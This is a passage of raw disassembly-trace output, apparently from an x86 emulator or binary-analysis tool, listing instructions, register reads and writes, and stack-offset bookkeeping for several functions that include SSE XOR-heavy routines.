0x8000 for stack size 0x10000 0x41db97: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41db98: mov esp, ebx, regs_read: [21], regs_write: [30] 0x41db9a: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41dba0: push ebp, regs_read: [30, 20], regs_write: [30] 0x41dba1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x100000003 and offset 0x8000 for stack size 0x10000 0x41dba6: mov edx, dword ptr [ebp + 0x18], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x100000003 and offset 0x8018 for stack size 0x10000 0x41dbac: mov eax, dword ptr [ebp + 0x1c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x100000003 and offset 0x801c for stack size 0x10000 0x41dbb2: push esi, regs_read: [30, 29], regs_write: [30] 0x41dbb3: mov esi, edx, regs_read: [24], regs_write: [29] 0x41dbba: push edi, regs_read: [30, 23], regs_write: [30] 0x41dbbe: mov edi, eax, regs_read: [19], regs_write: [23] 0x41dbcb: push dword ptr [ebp + 0x30], regs_read: [30, 20], regs_write: [30] 0x41dbce: mov ecx, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [22] adjusting stack for ESP 0xfffffff7 and offset 0x8014 for stack size 0x10000 0x41dbd4: push dword ptr [ebp + 0x2c], regs_read: [30, 20], regs_write: [30] 0x41dbd9: push dword ptr [ebp + 0x28], regs_read: [30, 20], regs_write: [30] 0x41dbdc: push dword ptr [ebp + 0x24], regs_read: [30, 20], regs_write: [30] 0x41dbdf: push dword ptr [ebp + 0x20], regs_read: [30, 20], regs_write: [30] 0x41dbe2: push eax, regs_read: [30, 19], regs_write: [30] 0x41dbe3: push edi, regs_read: [30, 23], regs_write: [30] 0x41dbe4: push esi, regs_read: [30, 29], regs_write: [30] 0x41dbe5: push ecx, regs_read: [30, 22], regs_write: [30] 0x41dbe6: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x41dbe9: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41dbf4: mov ecx, eax, regs_read: [19], regs_write: [22] 0x41dbf6: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0xffffffcf and offset 0x800c for stack size 0x10000 0x41dc01: mov edi, dword ptr [ebp - 4], regs_read: [20], regs_write: [23] adjusting stack for ESP 0xffffffcf and offset 0x7ffc for stack size 0x10000 0x41dc04: mov esi, dword ptr [ebp - 8], regs_read: [20], regs_write: [29] adjusting stack for ESP 0xffffffcf and offset 0x7ff8 for stack size 0x10000 0x41dc07: mov dword ptr [eax], esi, regs_read: [19, 29], regs_write: () 0x41dc09: mov dword ptr [eax + 4], edi, regs_read: [19, 23], regs_write: () 0x41dc0c: pop edi, regs_read: [30], regs_write: [30, 23] 0x41dc0d: mov eax, ecx, regs_read: [22], regs_write: [19] 0x41dc0f: pop esi, regs_read: [30], regs_write: [30, 29] 0x41dc10: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0xffffffd7 and offset 0x8000 for stack size 0x10000 0x41dc12: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41dc20: push ebx, regs_read: [30, 21], regs_write: [30] 0x41dc21: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x41dc2c: push ebp, regs_read: [30, 20], regs_write: [30] 0x41dc2d: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x41dc30: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP -0x4 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x41dc34: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x41dc39: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41dc40: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x4 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x41dc47: mov eax, dword ptr [ebx + 0x1c], regs_read: [21], regs_write: [19] 0x41dc4a: mov edx, dword ptr [ebx + 8], regs_read: [21], regs_write: [24] 0x41dc4d: mov ecx, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [22] 0x41dc50: push esi, regs_read: [30, 29], regs_write: [30] 0x41dc51: mov esi, dword ptr [ebx + 0x30], regs_read: [21], regs_write: [29] 0x41dc54: mov dword ptr [ebp - 0x44], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fbc for stack size 0x10000 saving data to stack: 0 4 0x41dc57: mov eax, dword ptr [ebx + 0x20], regs_read: [21], regs_write: [19] 0x41dc5a: mov dword ptr [ebp - 0x38], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fc8 for stack size 0x10000 saving data to stack: 0 4 0x41dc5d: mov eax, dword ptr [ebx + 0x2c], regs_read: [21], regs_write: [19] 0x41dc60: push edi, regs_read: [30, 23], regs_write: [30] 0x41dc61: mov edi, dword ptr [ebx + 0x24], regs_read: [21], regs_write: [23] 0x41dc64: mov dword ptr [ebp - 0x40], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 4 0x41dc67: mov esi, dword ptr [ebx + 0x14], regs_read: [21], regs_write: [29] 0x41dc6a: mov dword ptr [ebp - 0x48], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x41dc6d: mov dword ptr [ebp - 0x3c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 saving data to stack: 0 4 0x41dc70: mov dword ptr [ebp - 0x34], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fcc for stack size 0x10000 saving data to stack: 0 4 0x41dc8c: mov edx, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 0x41dc8f: mov eax, dword ptr [ebp - 0x34], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fcc for stack size 0x10000 0x41dc92: mov ecx, dword ptr [ebp - 0x3c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 0x41dc99: push dword ptr [ebp - 0x40], regs_read: [30, 20], regs_write: [30] 0x41dc9c: push eax, regs_read: [30, 19], regs_write: [30] 0x41dc9d: push edx, regs_read: [30, 24], regs_write: [30] 0x41dc9e: push edi, regs_read: [30, 23], regs_write: [30] 0x41dc9f: push dword ptr [ebp - 0x38], regs_read: [30, 20], regs_write: [30] 0x41dca2: push dword ptr [ebp - 0x44], regs_read: [30, 20], regs_write: [30] 0x41dca5: push edx, regs_read: [30, 24], regs_write: [30] 0x41dca6: push esi, regs_read: [30, 29], regs_write: [30] 0x41dca7: push ecx, regs_read: [30, 22], regs_write: [30] 0x41dca8: push dword ptr [ebx + 0xc], regs_read: [30, 21], regs_write: [30] 0x41dcb3: pop edi, regs_read: [30], regs_write: [30, 23] 0x41dcb4: pop esi, regs_read: [30], regs_write: [30, 29] 0x41dcb5: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x2c and offset 0x7ffc for stack size 0x10000 0x41dcbf: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x2c and offset 0x8000 for stack size 0x10000 0x41dcc1: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41dcc2: mov esp, ebx, regs_read: [21], regs_write: [30] 0x41dcc4: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41dcea: mov eax, dword ptr [ebp - 0x34], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x8 and offset 0x7fcc for stack size 0x10000 0x41dcf0: movaps xmmword ptr [ebp - 0x60], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP 0x8 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x41dcf4: mov dword ptr [ebp - 0x14], 0x2000000, regs_read: [20], regs_write: () adjusting stack for ESP 0x8 and offset 0x7fec for stack size 0x10000 saving data to stack: 33554432 4 0x41dcff: mov eax, dword ptr [eax + 8], regs_read: [19], regs_write: [19] 0x41dd02: mov dword ptr [ebp - 0x18], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x8 and offset 0x7fe8 for stack size 0x10000 saving data to stack: 0 4 0x41dd08: push eax, regs_read: [30, 19], regs_write: [30] 0x41dd09: push edi, regs_read: [30, 23], regs_write: [30] 0x41dd0a: push dword ptr [ebp - 0x38], regs_read: [30, 20], regs_write: [30] 0x41dd15: push esi, regs_read: [30, 29], regs_write: [30] 0x41dd16: push dword ptr [ebp - 0x3c], regs_read: [30, 20], regs_write: [30] 0x41dd19: push edx, regs_read: [30, 24], regs_write: [30] 0x41dd1a: push eax, regs_read: [30, 19], regs_write: [30] 0x41dd1e: push eax, regs_read: [30, 19], regs_write: [30] 0x41dd1f: push dword ptr [ebp - 0x40], regs_read: [30, 20], regs_write: [30] 0x41dd2a: push eax, regs_read: [30, 19], regs_write: [30] 0x41dd2b: push dword ptr [ebp - 0x44], regs_read: [30, 20], regs_write: [30] 0x41dd3d: push 0x10, regs_read: [30], regs_write: [30] 0x41dd3f: push eax, regs_read: [30, 19], regs_write: [30] 0x41dd45: push esi, regs_read: [30, 29], regs_write: [30] 0x41dd46: push 0, regs_read: [30], regs_write: [30] 0x41dd48: push dword ptr [ebp - 0x48], regs_read: [30, 20], regs_write: [30] 0x41dd56: pop edi, regs_read: [30], regs_write: [30, 23] 0x41dd57: pop esi, regs_read: [30], regs_write: [30, 29] 0x41dd58: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x30 and offset 0x7ffc for stack size 0x10000 0x41dd62: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x30 and offset 0x8000 for stack size 0x10000 0x41dd64: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41dd65: mov esp, ebx, regs_read: [21], regs_write: [30] 0x41dd67: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41dd69: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x8 and offset 0x7ffc for stack size 0x10000 0x41dd6e: pop edi, regs_read: [30], regs_write: [30, 23] 0x41dd71: pop esi, regs_read: [30], regs_write: [30, 29] 0x41dd77: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0x10 and offset 0x8000 for stack size 0x10000 0x41dd79: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41dd7a: mov esp, ebx, regs_read: [21], regs_write: [30] 0x41dd7c: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41dd80: push esi, regs_read: [30, 29], regs_write: [30] 0x41dd86: mov esi, eax, regs_read: [19], regs_write: [29] 0x41dd8f: pop esi, regs_read: [30], regs_write: [30, 29] 0x41dda0: push ebx, regs_read: [30, 21], regs_write: [30] 0x41dda1: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x41ddac: push ebp, regs_read: [30, 20], regs_write: [30] 0x41ddad: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x41ddb0: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP 0x0 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x41ddb4: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x41ddb9: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41ddc0: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x41ddc7: mov eax, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [19] 0x41ddca: mov edx, dword ptr [ebx + 0x1c], regs_read: [21], regs_write: [24] 0x41ddcd: mov ecx, dword ptr [ebx + 0x2c], regs_read: [21], regs_write: [22] 0x41ddd0: mov dword ptr [ebp - 0x4c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x41ddd3: mov eax, dword ptr [ebx + 0x18], regs_read: [21], regs_write: [19] 0x41ddd6: push esi, regs_read: [30, 29], regs_write: [30] 0x41ddd7: mov esi, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [29] 0x41ddda: mov dword ptr [ebp - 0x54], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x4 and offset 0x7fac for stack size 0x10000 saving data to stack: 0 4 0x41dddd: mov eax, dword ptr [ebx + 0x28], regs_read: [21], regs_write: [19] 0x41dde0: push edi, regs_read: [30, 23], regs_write: [30] 0x41dde1: mov edi, dword ptr [ebx + 0x20], regs_read: [21], regs_write: [23] 0x41dde4: mov dword ptr [ebp - 0x48], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x41dde7: mov dword ptr [ebp - 0x14], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fec for stack size 0x10000 saving data to stack: 0 4 0x41ddea: mov dword ptr [ebp - 0x44], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fbc for stack size 0x10000 saving data to stack: 0 4 0x41de06: mov edx, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x8 and offset 0x7fb8 for stack size 0x10000 0x41de15: mov dword ptr [ebp - 0x50], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x41de18: mov ecx, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x8 and offset 0x7fbc for stack size 0x10000 0x41de44: mov eax, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x7fec for stack size 0x10000 0x41de4a: movaps xmmword ptr [ebp - 0x70], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x41de52: mov eax, dword ptr [eax + 8], regs_read: [19], regs_write: [19] 0x41de55: mov dword ptr [ebp - 0x28], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fd8 for stack size 0x10000 saving data to stack: 0 4 0x41de58: mov eax, edi, regs_read: [23], regs_write: [19] 0x41de62: push eax, regs_read: [30, 19], regs_write: [30] 0x41de63: push edx, regs_read: [30, 24], regs_write: [30] 0x41de67: push eax, regs_read: [30, 19], regs_write: [30] 0x41de68: push ecx, regs_read: [30, 22], regs_write: [30] 0x41de6e: mov ecx, edi, regs_read: [23], regs_write: [22] 0x41de78: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fb8 for stack size 0x10000 0x41de80: movaps xmmword ptr [ebp - 0x20], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x41de84: push ecx, regs_read: [30, 22], regs_write: [30] 0x41de87: push eax, regs_read: [30, 19], regs_write: [30] 0x41de8b: push eax, regs_read: [30, 19], regs_write: [30] 0x41de91: push 0x10, regs_read: [30], regs_write: [30] 0x41de96: push eax, regs_read: [30, 19], regs_write: [30] 0x41de9a: push eax, regs_read: [30, 19], regs_write: [30] 0x41de9b: push dword ptr [ebp - 0x44], regs_read: [30, 20], regs_write: [30] 0x41dea6: mov eax, esi, regs_read: [29], regs_write: [19] 0x41deab: push eax, regs_read: [30, 19], regs_write: [30] 0x41deac: push dword ptr [ebp - 0x4c], regs_read: [30, 20], regs_write: [30] 0x41deb2: push eax, regs_read: [30, 19], regs_write: [30] 0x41deb3: push dword ptr [ebp - 0x44], regs_read: [30, 20], regs_write: [30] 0x41debb: mov ecx, esi, regs_read: [29], regs_write: [22] 0x41dec5: mov eax, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x44 and offset 0x7fb4 for stack size 0x10000 0x41decd: movaps xmmword ptr [ebp - 0x20], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x44 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x41ded1: push ecx, regs_read: [30, 22], regs_write: [30] 0x41ded4: push eax, regs_read: [30, 19], regs_write: [30] 0x41ded8: push eax, regs_read: [30, 19], regs_write: [30] 0x41dede: push 0x10, regs_read: [30], regs_write: [30] 0x41dee3: push eax, regs_read: [30, 19], regs_write: [30] 0x41dee7: push eax, regs_read: [30, 19], regs_write: [30] 0x41dee8: push dword ptr [ebp - 0x44], regs_read: [30, 20], regs_write: [30] 0x41defa: mov dword ptr [ebp - 0x24], 0x1000000, regs_read: [20], regs_write: () adjusting stack for ESP -0x60 and offset 0x7fdc for stack size 0x10000 saving data to stack: 16777216 4 0x41df14: mov ecx, 0xd, regs_read: (), regs_write: [22] 0x41df1d: movaps xmm0, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x60 and offset 0x7fd0 for stack size 0x10000 0x41df25: mov edx, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x60 and offset 0x7fbc for stack size 0x10000 0x41df40: pxor xmm0, xmmword ptr [edx], regs_read: [122, 24], regs_write: [122] adjusting stack for ESP -0x60 and offset 0x8000 for stack size 0x10000 0x41df5b: push 0x10, regs_read: [30], regs_write: [30] 0x41df60: push eax, regs_read: [30, 19], regs_write: [30] 0x41df64: push eax, regs_read: [30, 19], regs_write: [30] 0x41df65: push edx, regs_read: [30, 24], regs_write: [30] 0x41df73: movaps xmm1, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x70 and offset 0x7f90 for stack size 0x10000 0x41df83: push eax, regs_read: [30, 19], regs_write: [30] 0x41df84: push dword ptr [ebp - 0x54], regs_read: [30, 20], regs_write: [30] 0x41df87: pxor xmm1, xmmword ptr [ebp - 0x40], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0x78 and offset 0x7fc0 for stack size 0x10000 0x41df95: mov esi, eax, regs_read: [19], regs_write: [29] 0x41df9a: push 0x10, regs_read: [30], regs_write: [30] 0x41df9c: push eax, regs_read: [30, 19], regs_write: [30] 0x41dfa5: mov eax, esi, regs_read: [29], regs_write: [19] 0x41dfa7: pop edi, regs_read: [30], regs_write: [30, 23] 0x41dfa8: pop esi, regs_read: [30], regs_write: [30, 29] 0x41dfa9: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x78 and offset 0x7ffc for stack size 0x10000 0x41dfb3: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x78 and offset 0x8000 for stack size 0x10000 0x41dfb5: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41dfb6: mov esp, ebx, regs_read: [21], regs_write: [30] 0x41dfb8: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41dfba: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x8 and offset 0x7ffc for stack size 0x10000 0x41dfc0: pop edi, regs_read: [30], regs_write: [30, 23] 0x41dfc3: pop esi, regs_read: [30], regs_write: [30, 29] 0x41dfc9: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0x10 and offset 0x8000 for stack size 0x10000 0x41dfcb: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41dfcc: mov esp, ebx, regs_read: [21], regs_write: [30] 0x41dfce: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41dfd0: push ebx, regs_read: [30, 21], regs_write: [30] 0x41dfd1: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x41dfdc: push ebp, regs_read: [30, 20], regs_write: [30] 0x41dfdd: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x41dfe0: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP 0x0 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x41dfe4: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x41dfe9: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41dff0: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x41dff3: mov ecx, dword ptr [ebx + 0x14], regs_read: [21], regs_write: [22] 0x41dff6: mov edx, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [24] 0x41dff9: push esi, regs_read: [30, 29], regs_write: [30] 0x41dffc: mov dword ptr [ebp - 0x10], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x4 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 1 4 0x41dfff: push edi, regs_read: [30, 23], regs_write: [30] 0x41e000: mov edi, dword ptr [ebx + 8], regs_read: [21], regs_write: [23] 0x41e012: mov edx, 0xe0, regs_read: (), regs_write: [24] 0x41e017: mov ecx, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [22] 0x41e01c: movaps xmm6, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [128] 0x41e023: movaps xmm7, xmmword ptr [0x4c9b40], regs_read: (), regs_write: [129] 0x41e02a: mov dword ptr [ebp - 8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x41e02d: mov dword ptr [ebp - 0xc], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff4 for stack size 0x10000 saving data to stack: 224 4 0x41e036: mov edx, 0xd, regs_read: (), regs_write: [24] 0x41e04d: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e051: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41e054: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41e057: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x41e072: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e088: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41e091: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e095: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41e09e: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e0a2: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41e0b1: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e0b5: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e0be: mov ecx, dword ptr [ebp - 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x8 and offset 0x7ff8 for stack size 0x10000 0x41e0c1: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41e0c4: mov edx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x8 and offset 0x7ff0 for stack size 0x10000 0x41e0cd: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x7ff4 for stack size 0x10000 0x41e0dd: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e0e6: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x41e0ee: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e0f2: mov dword ptr [ebp - 8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x41e0fb: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e0ff: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x41e10d: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e111: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e121: mov ecx, dword ptr [ebx + 0x14], regs_read: [21], regs_write: [22] 0x41e12f: mov eax, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [19] 0x41e132: movaps xmm0, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [122] 0x41e139: mov dword ptr [ebp - 0xc], 0x60, regs_read: [20], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff4 for stack size 0x10000 saving data to stack: 96 4 0x41e148: mov dword ptr [ebp - 8], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x41e14b: mov edx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x8 and offset 0x7ff0 for stack size 0x10000 0x41e150: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x7ff8 for stack size 0x10000 0x41e172: pxor xmm7, xmmword ptr [edx], regs_read: [129, 24], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e176: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x41e179: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x41e188: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e18c: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x41e195: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x41e198: movaps xmm6, xmm1, regs_read: [123], regs_write: [128] 0x41e1a1: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e1a5: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x41e1c0: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e1c4: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e1c8: movaps xmm7, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [129] 0x41e1cf: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e1e3: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41e1e6: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x41e1ef: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e1f3: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41e202: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e217: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e220: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e224: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41e227: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x41e230: pxor xmm4, xmm2, regs_read: [126, 124], regs_write: [126] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e234: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41e243: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e258: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e261: pxor xmm6, xmm5, regs_read: [128, 127], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e265: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41e268: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x41e271: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e275: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41e284: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e28c: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP 